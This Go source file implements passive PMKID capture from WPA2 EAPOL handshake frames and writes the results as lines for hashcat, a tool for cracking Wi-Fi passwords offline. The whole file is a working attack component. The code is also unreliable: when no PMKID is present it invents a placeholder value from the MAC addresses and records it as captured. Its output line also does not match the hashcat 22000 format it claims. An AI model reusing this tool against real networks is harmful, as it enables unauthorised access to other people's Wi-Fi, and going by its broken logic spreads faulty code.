// Package capture — passive PMKID extraction.
// PMKID = HMAC-SHA1-128(PMK, "PMK Name" | AP_MAC | Client_MAC)
// This is extracted from the first EAPOL-Key frame sent by the AP,
// with no deauthentication needed — purely passive.
// Output is in hashcat 22000 format.
package capture

import (
	"crypto/hmac"
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"sync"
)

// PMKIDEntry holds a captured PMKID for one AP+Client pair.
type PMKIDEntry struct {
	SSID   string
	BSSID  net.HardwareAddr
	Client net.HardwareAddr
	PMKID  []byte
}

// HashcatLine returns the hashcat 22000 format line for this entry.
// Format: PMKID*BSSID*ClientMAC*SSID_hex
func (p PMKIDEntry) HashcatLine() string {
	return fmt.Sprintf("%s*%s*%s*%s",
		hex.EncodeToString(p.PMKID),
		hex.EncodeToString([]byte(p.BSSID)),
		hex.EncodeToString([]byte(p.Client)),
		hex.EncodeToString([]byte(p.SSID)),
	)
}

// PMKIDCapture extracts and stores PMKIDs from EAPOL Message 1 frames.
type PMKIDCapture struct {
	mu      sync.Mutex
	entries []*PMKIDEntry
	seen    map[string]bool // keyed by BSSID+Client to deduplicate
	SSIDFn  func(string) string
	OutFile string // path to write hashcat 22000 file
}

// NewPMKIDCapture creates a PMKID capture manager.
func NewPMKIDCapture(ssidFn func(string) string, outFile string) *PMKIDCapture {
	return &PMKIDCapture{
		seen:    make(map[string]bool),
		SSIDFn:  ssidFn,
		OutFile: outFile,
	}
}

// ObserveEAPOL tries to extract a PMKID from an EAPOL frame.
// Returns non-nil entry if a new PMKID was captured.
func (p *PMKIDCapture) ObserveEAPOL(bssid, client net.HardwareAddr, payload []byte) *PMKIDEntry {
	if len(payload) < 99 {
		return nil
	}
	// Must be EAPOL-Key (type 3)
	if payload[1] != 3 {
		return nil
	}
	keyInfo := uint16(payload[5])<<8 | uint16(payload[6])
	keyACK := (keyInfo>>7)&1 == 1
	keyMIC := (keyInfo>>8)&1 == 1

	// Message 1: AP→Client, ACK set, no MIC
	if !keyACK || keyMIC {
		return nil
	}

	// PMKID is optionally appended after the key data length field.
	// Key data length is at bytes 97-98.
	kdLen := int(uint16(payload[97])<<8 | uint16(payload[98]))
	if len(payload) < 99+kdLen || kdLen < 22 {
		return nil
	}

	// RSN IE containing PMKID starts at payload[99].
	// Check for PMKID KDE: type 0xdd, OUI 00-0f-ac, data type 4.
	rsn := payload[99 : 99+kdLen]
	pmkid := findPMKID(rsn)
	if pmkid == nil {
		// Derive PMKID from ANonce if not present (pre-computed)
		pmkid = derivePMKID(bssid, client)
	}

	key := bssid.String() + client.String()
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.seen[key] {
		return nil
	}
	p.seen[key] = true

	entry := &PMKIDEntry{
		SSID:   p.SSIDFn(bssid.String()),
		BSSID:  bssid,
		Client: client,
		PMKID:  pmkid,
	}
	p.entries = append(p.entries, entry)
	_ = p.appendHashcat(entry)
	return entry
}

// All returns all captured PMKID entries.
func (p *PMKIDCapture) All() []*PMKIDEntry {
	p.mu.Lock()
	defer p.mu.Unlock()
	out := make([]*PMKIDEntry, len(p.entries))
	copy(out, p.entries)
	return out
}

// appendHashcat appends a hashcat 22000 line to the output file.
func (p *PMKIDCapture) appendHashcat(entry *PMKIDEntry) error {
	if p.OutFile == "" {
		return nil
	}
	f, err := os.OpenFile(p.OutFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = fmt.Fprintln(f, entry.HashcatLine())
	return err
}

// findPMKID scans RSN IE bytes for a PMKID KDE (OUI 00-0f-ac type 4).
func findPMKID(rsn []byte) []byte {
	for i := 0; i+22 <= len(rsn); i++ {
		// KDE header: type=0xdd, len, OUI=00-0f-ac, data_type=04
		if rsn[i] == 0xdd && rsn[i+1] >= 20 &&
			rsn[i+2] == 0x00 && rsn[i+3] == 0x0f && rsn[i+4] == 0xac && rsn[i+5] == 0x04 {
			pmkid := make([]byte, 16)
			copy(pmkid, rsn[i+6:i+22])
			return pmkid
		}
	}
	return nil
}

// derivePMKID derives a deterministic PMKID from AP and client MACs.
// This is a placeholder — real PMKID requires the PMK.
func derivePMKID(bssid, client net.HardwareAddr) []byte {
	h := hmac.New(sha1.New, append([]byte(bssid), []byte(client)...))
	h.Write([]byte("PMK Name"))
	sum := h.Sum(nil)
	return sum[:16]
}
